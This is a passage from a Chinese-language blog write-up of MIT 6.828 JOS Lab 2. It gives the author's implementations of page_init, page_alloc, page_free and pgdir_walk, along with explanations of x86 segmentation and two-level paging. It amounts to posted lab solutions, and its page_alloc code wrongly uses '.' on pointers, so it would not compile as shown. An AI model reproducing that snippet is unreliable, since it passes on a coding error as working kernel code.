Initialize page structure and memory free list.</span></span><br><span class="line"><span class="comment">// After this is done, NEVER use boot_alloc again.  ONLY use the page</span></span><br><span class="line"><span class="comment">// allocator functions below to allocate and deallocate physical</span></span><br><span class="line"><span class="comment">// memory via the page_free_list.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>接下来按注释进行补全，我们需要明确哪些页在&#x2F;不在空闲状态：</p><ul><li>第一张物理内存页为在使用状态，保存着实模式的 IDT 与 BIOS 结构</li><li><code>[PGSIZE, npages_basemem * PGSIZE)</code> 为可用的空闲内存</li><li><code>[IOPHYSMEM, EXTPHYSMEM)</code> 这一块内存用作 IO，对我们来说是一个“内存空洞”，也不应当被使用</li><li><code>[EXTPHYSMEM, ...)</code> 这一块扩展内存，有的是在使用着的，有的又是空闲的，我们需要绕开：<ul><li>内核镜像</li><li>页表</li><li>其他数据结构</li></ul></li></ul><p>最后一个似乎比较棘手，但我们知道 boot_alloc() 初始化 nextfree 时用到一个变量 end 指向内核 bss 段末尾，说明<strong>往后的都是可用的内存</strong>，因此我们只需要将第三项往后一直到 nextfree 的内存页设为使用状态、nextfree 往后的内存设为空闲页链入 freelist 即可</p><p>这里我们需要注意一个点：<code>boot_alloc()</code> 分配的是虚拟内存，<strong>但是 pages 数组对应的是物理内存</strong>，因此这里别忘了进行转换（笔者就在这碰了坑）</p><p>注意以上这些标准之后，修改 <code>page_init()</code> 的代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// The example code here marks all physical pages as free.</span></span><br><span class="line"><span class="comment">// However this is not truly the case.  What memory is free?</span></span><br><span class="line"><span class="comment">//  1) Mark physical page 0 as in use.</span></span><br><span class="line"><span class="comment">//     This way we preserve the real-mode IDT and BIOS structures</span></span><br><span class="line"><span class="comment">//     in case we ever need them.  (Currently we don&#x27;t, but...)</span></span><br><span class="line"><span class="comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span></span><br><span class="line"><span class="comment">//     is free.</span></span><br><span class="line"><span class="comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span></span><br><span class="line"><span class="comment">//     never be allocated.</span></span><br><span class="line"><span class="comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span></span><br><span class="line"><span class="comment">//     Some of it is in use, some is free. Where is the kernel</span></span><br><span class="line"><span class="comment">//     in physical memory?  Which pages are already in use for</span></span><br><span class="line"><span class="comment">//     page tables and other data structures?</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Change the code to reflect this.</span></span><br><span class="line"><span class="comment">// NB: DO NOT actually touch the physical memory corresponding to</span></span><br><span class="line"><span class="comment">// free pages!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0) init</span></span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">size_t</span> next_free_addr;</span><br><span class="line">page_free_list = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1) real-mode IDT and BIOS</span></span><br><span class="line">pages[<span class="number">0</span>].pp_ref = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2) [PGSIZE, npages_basemem * PGSIZE), all free</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; npages_basemem; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3) [IOPHYSMEM, EXTPHYSMEM), treat it as a hole</span></span><br><span class="line"><span class="keyword">for</span> (i = IOPHYSMEM/PGSIZE; i &lt; EXTPHYSMEM/PGSIZE; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4) kernel image, page tables, other structure in user, others free</span></span><br><span class="line">next_free_addr = (<span class="type">size_t</span>) PADDR(boot_alloc(<span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span> (i = EXTPHYSMEM/PGSIZE; i &lt; next_free_addr / PGSIZE; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = next_free_addr / PGSIZE; i &lt; npages; i++) &#123;</span><br><span class="line">pages[i].pp_ref = <span class="number">0</span>;</span><br><span class="line">pages[i].pp_link = page_free_list;</span><br><span class="line">page_free_list = &amp;pages[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-alloc-：分配单个空闲页面"><a href="#page-alloc-：分配单个空闲页面" class="headerlink" title="page_alloc()：分配单个空闲页面"></a>page_alloc()：分配单个空闲页面</h4><p>这一块比较简单，直接从 freelist 中取出一个页面即可，这里注意如果有 <code>ALLOC_ZERO</code> 则需要我们帮忙清零，<strong>而且我们分配时不应当增加引用计数，这应该是由 caller 完成的</strong></p><p>这里我们别忘了在清零时应当用 <code>page2kva</code> 将 PageInfo 结构体地址转化为其对应页面的虚拟地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocates a physical page.  If (alloc_flags &amp; ALLOC_ZERO), fills the entire</span></span><br><span class="line"><span class="comment">// returned physical page with &#x27;\0&#x27; bytes.  Does NOT increment the reference</span></span><br><span class="line"><span class="comment">// count of the page - the caller must do these if necessary (either explicitly</span></span><br><span class="line"><span class="comment">// or via page_insert).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Be sure to set the pp_link field of the allocated page to NULL so</span></span><br><span class="line"><span class="comment">// page_free can check for double-free bugs.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns NULL if out of free memory.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint: use page2kva and memset</span></span><br><span class="line"><span class="keyword">struct</span> PageInfo *</span><br><span class="line"><span class="title function_">page_alloc</span><span class="params">(<span class="type">int</span> alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">victim</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// out of memory</span></span><br><span class="line"><span class="keyword">if</span> (!page_free_list)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// normal alloc</span></span><br><span class="line">victim = page_free_list;</span><br><span class="line">page_free_list = page_free_list.pp_link;</span><br><span class="line">victim.pp_link = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_ZERO)</span><br><span class="line"><span class="built_in">memset</span>(page2kva(victim), <span class="number">0</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="page-free-：释放单个页面"><a href="#page-free-：释放单个页面" class="headerlink" title="page_free()：释放单个页面"></a>page_free()：释放单个页面</h4><p>主要是一些检查之后插入 freelist 头部即可，笔者还自行加了一个类似 ptmalloc 中对头部的简易 double free 检测（笑）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Return a page to the free list.</span></span><br><span class="line"><span class="comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"><span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></span><br><span class="line"><span class="comment">// pp-&gt;pp_link is not NULL.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check for double free at top</span></span><br><span class="line"><span class="keyword">if</span> (pp == page_free_list)</span><br><span class="line">panic(<span class="string">&quot;double free detected (freelist top)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check double free by pp_link</span></span><br><span class="line"><span class="keyword">if</span> (pp-&gt;pp_link)</span><br><span class="line">panic(<span class="string">&quot;double free detected (pp_link)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check validation by pp_ref</span></span><br><span class="line"><span class="keyword">if</span> (pp-&gt;pp_ref)</span><br><span class="line">panic(<span class="string">&quot;cannot free a page in use!&quot;</span>);</span><br><span class="line"></span><br><span class="line">pp-&gt;pp_link = page_free_list;</span><br><span class="line">page_free_list = pp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里 Exercise 1 就完成了，接下来进入 Part2.</p><h2 id="Part-2-Virtual-Memory"><a href="#Part-2-Virtual-Memory" class="headerlink" title="Part 2: Virtual Memory"></a>Part 2: Virtual Memory</h2><p>一上来就是 Exercise 2，主要是让我们了解 80386 下的<strong>分段</strong>和<strong>分页</strong></p><blockquote><p><strong>Exercise 2.</strong> Look at chapters 5 and 6 of the <a href="https://pdos.csail.mit.edu/6.828/2018/readings/i386/toc.htm">Intel 80386 Reference Manual</a>, if you haven’t done so already. Read the sections about page translation and page-based protection closely (5.2 and 6.4). We recommend that you also skim the sections about segmentation; while JOS uses the paging hardware for virtual memory and protection, segment translation and segment-based protection cannot be disabled on the x86, so you will need a basic understanding of it.</p></blockquote><p>分段大家都懂，就是一个段寄存器里存放段选择子对应一个段描述符表示一块连续的内存称为一个segment，分页则是依托页表这一结构建立起虚拟地址到物理地址间的映射，那么是不是说明分页出现以后分段就自然而然地消失了呢？答案是否定的，<strong>分页与分段其实是同时存在的</strong>，因为这是由硬件（CPU）提供的功能</p><p>下图是一张分页与分段相结合的逻辑地址到物理地址间转换的过程</p><p><img src="https://s2.loli.net/2022/03/15/fYIXuTGWdMn7ViE.png" alt="image.png"></p><p>笔者这里参照其提供的文档简述一下分段+分页下的地址翻译</p><h4 id="Segment-Translation"><a href="#Segment-Translation" class="headerlink" title="Segment Translation"></a>Segment Translation</h4><p>进入保护模式之后，段寄存器并没有弃用，仍然承担着其“描述一个内存段”的作用，但仅有 16 位的、数量少得可怜的段寄存器早已无法满足人们的需求，因此在保护模式下段寄存器不再直接存放段的基址，而是存放着「段选择子」（segment selector）——真正的段描述符（segment descriptor）存放在一个名为「段描述符表」（segment descriptor table）的一块连续内存上，段选择子用以标识对应的段描述符在段描述符表中的下标与段的权限</p><p>因此在访问一个虚拟地址（逻辑地址）时首先需要通过段描述符翻译成对应的线性地址（若未开启分页则翻译的结果便直接为物理地址）</p><p><img src="https://s2.loli.net/2022/03/15/jhiSsfPoKgVyGdR.png" alt="image.png"></p><p>一个段描述符有着如下结构，需要注意的是<strong>系统段</strong>与普通的数据段和代码段等是有些许区别的，后者就是我们常用的普通的段，而前者通常用于表示中断门、陷阱门、调用门等</p><p><img src="https://s2.loli.net/2022/03/15/xhKpzoEHBXnVRk1.png" alt="image.png"></p><p>当然，既然段寄存器里存放的变成了段选择子，那么我们自然需要一个新的结构来对应表示段描述符表的地址，段描述符表分为两种——全局段描述符表与局部段描述符表，因而页引入了两个新的寄存器——GDTR 与 LDTR</p><p>需要注意的是，全局段描述符表的第一个段描述符为<strong>不可用的段描述符</strong></p><p><img src="https://s2.loli.net/2022/03/15/izYW8Dp7feT1wNE.png" alt="image.png"></p><p>最后我们来看段寄存器中存放的段选择子，结构较为简单，主要就是存放了对应的段描述符在段描述符表中的下标、访问权限、对应位于全局&#x2F;局部段描述符表</p><p><img src="https://s2.loli.net/2022/03/15/74PQFlKoHqLbsyW.png" alt="image.png"></p><blockquote><p>关于分段机制，更详细深入的说明参见 <a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89</a></p></blockquote><h4 id="Page-Translation"><a href="#Page-Translation" class="headerlink" title="Page Translation"></a>Page Translation</h4><p>讲完了分段机制，接下来到分页机制，分页机制将物理内存以「页」为粒度进行管理，通过「页表」这一数据结构完成线性地址到物理地址之间的映射</p><p>在保护模式下，是否开启分页是通过 Cr0 寄存器的 PG 位标识的，<strong>但是分段是默认开启的</strong>，怎么处理分段与分页之间的冲突呢？笔者认为可以这么理解：<strong>在开启分页之前，分段是直接对物理地址空间进行分段；在开启分页之后，分段是对页表映射后的线性地址空间进行分段</strong>，相当于是在分段与物理地址之间插入了一个中间层</p><p>于是我们接下来来看 32 位下启用二级页表的分页机制，在分页机制下一个 32 位的线性地址有着这样的三段式结构：</p><p><img src="https://s2.loli.net/2022/03/15/3pScjrUCxOkwJA7.png" alt="image.png"></p><p>在 Cr3 寄存器中存放着页目录表的地址；MMU在将一个线性地址翻译成物理地址时，首先通过 Cr3 寄存器获取到页目录表地址，通过线性地址的 DIR 域找到页目录表对应下标的页目录表项（Page Directory Entry），页目录表项中存放着对应的页表的地址，再通过线性地址的 PAGE 域找到页表对应下标的页表项（Page Table Entry），页表项中存放着对应的物理页地址，最后通过 OFFSET 域（即页内偏移）访问到对应物理页的对应数据</p><p><img src="https://s2.loli.net/2022/03/15/bnYKURW1xPg7CHN.png" alt="image.png"></p><p>一个页（目录）表项有着如下的结构，由于页目录表、页表、物理页都是以页为单位对齐的，因此我们只需要存放以页为单位的地址即可，空闲下来的这些位被用以存放页访问、读写权限等</p><p><img src="https://s2.loli.net/2022/03/15/begX4uJNymUs92a.png" alt="image.png"></p><h3 id="Virtual-Linear-and-Physical-Addresses"><a href="#Virtual-Linear-and-Physical-Addresses" class="headerlink" title="Virtual, Linear, and Physical Addresses"></a>Virtual, Linear, and Physical Addresses</h3><p>我们现在正式对一堆各种地址名词下定义：</p><ul><li>「虚拟地址」：基于分段机制表示的地址，由一个段选择子与段内偏移组成</li><li>「线性地址」：基于分页机制表示的地址，是经过了分段翻译后的一个地址</li><li>「物理地址」：RAM 上的真实地址</li></ul><p>得到如下转换图例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">           Selector  +--------------+         +-----------+</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     | Segmentation |         |  Paging   |</span><br><span class="line">Software             |              |--------&gt;|           |----------&gt;  RAM</span><br><span class="line">            Offset   |  Mechanism   |         | Mechanism |</span><br><span class="line">          ----------&gt;|              |         |           |</span><br><span class="line">                     +--------------+         +-----------+</span><br><span class="line">            Virtual                   Linear                Physical</span><br></pre></td></tr></table></figure><p>其实在分页机制出现之后，分段机制就没有什么存在的意义了，因此你可以看到现代操作系统基本上都很少提分段的概念，大部分情况下虚拟地址就直接是线性地址（当然，其实还是有一些地方用到分段的权限验证等特性的）</p><p>同样地，为了简化地址翻译的操作，在 <code>boot/boot.S</code> 中 JOS <strong>初始化了一个所有的段描述符都对应段基址 0、段界限 0xffffffff 的全局段描述符表</strong>，这样虚拟地址实际上就直接是线性地址了</p><p>下面来看 Exercise 3，主要让我们熟悉 Qemu 提供的一些查看内存的指令</p><blockquote><p><strong>Exercise 3.</strong> While GDB can only access QEMU’s memory by virtual address, it’s often useful to be able to inspect physical memory while setting up virtual memory. Review the QEMU <a href="https://pdos.csail.mit.edu/6.828/2018/labguide.html#qemu">monitor commands</a> from the lab tools guide, especially the <code>xp</code> command, which lets you inspect physical memory. To access the QEMU monitor, press Ctrl-a c in the terminal (the same binding returns to the serial console).</p><p>Use the xp command in the QEMU monitor and the x command in GDB to inspect memory at corresponding physical and virtual addresses and make sure you see the same data.</p><p>Our patched version of QEMU provides an info pg command that may also prove useful: it shows a compact but detailed representation of the current page tables, including all mapped memory ranges, permissions, and flags. Stock QEMU also provides an info mem command that shows an overview of which ranges of virtual addresses are mapped and with what permissions.</p></blockquote><p>先按 <code>Ctrl + A</code>，然后再按 <code>C</code>，进入 Qemu 的 monitor 模式，使用 <code>info pg</code> 指令查看分页映射，如下：</p><p><img src="https://s2.loli.net/2022/03/15/FlrKz6RbmSIBQf4.png" alt="image.png"></p><p>使用 <code>xp</code> 命令查看对应物理内存上数据与两个映射的虚拟地址上数据，完全一致</p><p><img src="https://s2.loli.net/2022/03/15/hupwIHRkyqefoD3.png" alt="image.png"></p><p>最后是 <code>info mem</code> 查看地址空间权限，虚拟地址空间起始 4MB 仅为可读权限，位于虚拟地址高 256MB 的起始 4MB 为可读写权限，<strong>但实际上对应的都是同一块物理地址空间</strong></p><p><img src="https://s2.loli.net/2022/03/15/N8nMTkh6Pgqlj5m.png" alt="image.png"></p><p>继续往下，在 JOS 中定义了两个 <code>uint32_t</code> 的别名 <code>uintptr_t</code> 与 <code>physaddr_t</code> 表示虚拟地址与物理地址（在编译器看来其实没有什么区别）</p><table><thead><tr><th>C type</th><th>Address type</th></tr></thead><tbody><tr><td><code>T*</code></td><td>Virtual</td></tr><tr><td><code>uintptr_t</code></td><td>Virtual</td></tr><tr><td><code>physaddr_t</code></td><td>Physical</td></tr></tbody></table><p>接下来是 MIT 6.828 的一个小习题：</p><blockquote><p><strong>Question</strong></p><ol><li>Assuming that the following JOS kernel code is correct, what type should variable <code>x</code> have, <code>uintptr_t</code> or <code>physaddr_t</code>?</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mystery_t x;</span><br><span class="line">char* value = return_a_pointer();</span><br><span class="line">*value = 10;</span><br><span class="line">x = (mystery_t) value;</span><br></pre></td></tr></table></figure></blockquote><p>我们知道虚拟地址是可以通过 MMU 进行翻译访问到物理地址的，但是一个物理地址经过 MMU 之后得到的可能是奇形怪状的东西（比如说物理地址同值的虚拟地址已经建立了一个映射），所以这里的 x 应当是 <code>uintptr_t</code> 类型</p><h3 id="Reference-counting"><a href="#Reference-counting" class="headerlink" title="Reference counting"></a>Reference counting</h3><p>在用以表示单个物理页框的 <code>PageInfo</code> 结构体中的成员 <code>pp_ref</code> 用以表示一张页面被引用的次数（引用计数），引用计数为 0 时表示该页为空闲页，但是引用计数的增&#x2F;减<strong>应当由使用者完成</strong>，因此在我们调用 <code>page_alloc()</code> 之后应当立即将引用计数 + 1，而当引用计数为 0 时我们才应当调用 <code>page_free()</code> 释放一张内存页</p><blockquote><p>最后这个工作 JOS 归并在 <code>page_decref()</code> 中完成</p></blockquote><h3 id="Page-Table-Management"><a href="#Page-Table-Management" class="headerlink" title="Page Table Management"></a>Page Table Management</h3><p>接下来是 Exercise4，让我们完成对页表的管理，补全对应函数</p><blockquote><p><strong>Exercise 4.</strong> In the file <code>kern/pmap.c</code>, you must implement code for the following functions.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pgdir_walk()</span><br><span class="line">boot_map_region()</span><br><span class="line">page_lookup()</span><br><span class="line">page_remove()</span><br><span class="line">page_insert()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>check_page()</code>, called from <code>mem_init()</code>, tests your page table management routines. You should make sure it reports success before proceeding.</p></blockquote><h4 id="pgdir-walk-：（创建并）返回-PTE"><a href="#pgdir-walk-：（创建并）返回-PTE" class="headerlink" title="pgdir_walk()：（创建并）返回 PTE"></a>pgdir_walk()：（创建并）返回 PTE</h4><p>按惯例先看注释，对于一个给定的页目录表地址与一个线性地址，该函数应当返回对应的「页表项」的地址，若对应的页表为空且指定了 <code>create</code> 标志位，则分配一张新的物理页作为新的页表，若否、或是分配物理页失败则直接返回 NULL；分配成功后应当增加该页的引用计数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Given &#x27;pgdir&#x27;, a pointer to a page directory, pgdir_walk returns</span></span><br><span class="line"><span class="comment">// a pointer to the page table entry (PTE) for linear address &#x27;va&#x27;.</span></span><br><span class="line"><span class="comment">// This requires walking the two-level page table structure.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The relevant page table page might not exist yet.</span></span><br><span class="line"><span class="comment">// If this is true, and create == false, then pgdir_walk returns NULL.</span></span><br><span class="line"><span class="comment">// Otherwise, pgdir_walk allocates a new page table page with page_alloc.</span></span><br><span class="line"><span class="comment">//    - If the allocation fails, pgdir_walk returns NULL.</span></span><br><span class="line"><span class="comment">//    - Otherwise, the new page&#x27;s reference count is incremented,</span></span><br><span class="line"><span class="comment">//the page is cleared,</span></span><br><span class="line"><span class="comment">//and pgdir_walk returns a pointer into the new page table page.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 1: you can turn a PageInfo * into the physical address of the</span></span><br><span class="line"><span class="comment">// page it refers to with page2pa() from kern/pmap.h.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 2: the x86 MMU checks permission bits in both the page directory</span></span><br><span class="line"><span class="comment">// and the page table, so it&#x27;s safe to leave permissions in the page</span></span><br><span class="line"><span class="comment">// directory more permissive than strictly necessary.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 3: look at inc/mmu.h for useful macros that manipulate page</span></span><br><span class="line"><span class="comment">// table and page directory entries.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>参照源码其他地方的相关写法，利用 JOS 提供的一些宏很容易就能补完该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pte_t</span> *</span><br><span class="line"><span class="title function_">pgdir_walk</span><span class="params">(<span class="type">pde_t</span> *pgdir, <span class="type">const</span> <span class="type">void</span> *va, <span class="type">int</span> create)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Fill this function in</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> pde_idx;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span> *<span class="title">new_page_table_page</span>;</span></span><br><span class="line"><span class="type">pte_t</span> *page_table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pgdir)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create page table if not exist</span></span><br><span class="line">pde_idx = PDX(va);</span><br><span class="line"><span class="keyword">if</span> (!pgdir[pde_idx] || !(pgdir[pde_idx] &amp; PTE_P))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (create)</span><br><span class="line">&#123;</span><br><span class="line">new_page_table_page = page_alloc(ALLOC_ZERO);</span><br><span class="line"><span class="keyword">if</span> (!new_page_table_page)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">new_page_table_page-&gt;pp_ref++;</span><br><span class="line">pgdir[pde_idx] = (<span class="type">pde_t</span>) (page2pa(new_page_table_page) | PTE_P | PTE_W | PTE_U);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// align to PGSIZE</span></span><br><span class="line">page_table = (<span class="type">pte_t</span>*) ((<span class="type">uint32_t</span>) KADDR(pgdir[pde_idx]) &amp; (~(PGSIZE - <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &amp;page_table[PTX(va)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="boot-map-region-：建立虚拟地址区域到物理地址区域映射"><a href="#boot-map-region-：建立虚拟地址区域到物理地址区域映射" class="headerlink" title="boot_map_region()：建立虚拟地址区域到物理地址区域映射"></a>boot_map_region()：建立虚拟地址区域到物理地址区域映射</h4><p>惯例先看注释，主要是建立虚拟地址 <code>[va, va+size)</code> 到物理地址 <code>[pa, pa+size)</code> 之间的映射，提示我们使用 <code>pgdir_walk()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Map [va, va+size) of virtual address space to physical [pa, pa+size)</span></span><br><span class="line"><span class="comment">// in the page table rooted at pgdir.  Size is a multiple of PGSIZE, and</span></span><br><span class="line"><span class="comment">// va and pa are both page-aligned.</span></span><br><span class="line"><span class="comment">// Use permission bits perm|PTE_P for the entries.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This function is only intended to set up the ``static&#x27;&#x27; mappings</span></span><br><span class="line"><span class="comment">// above UTOP. As such, it should *not* change the pp_ref field on the</span></span><br><span class="line"><span class="comment">// mapped pages.</span></span><br><span 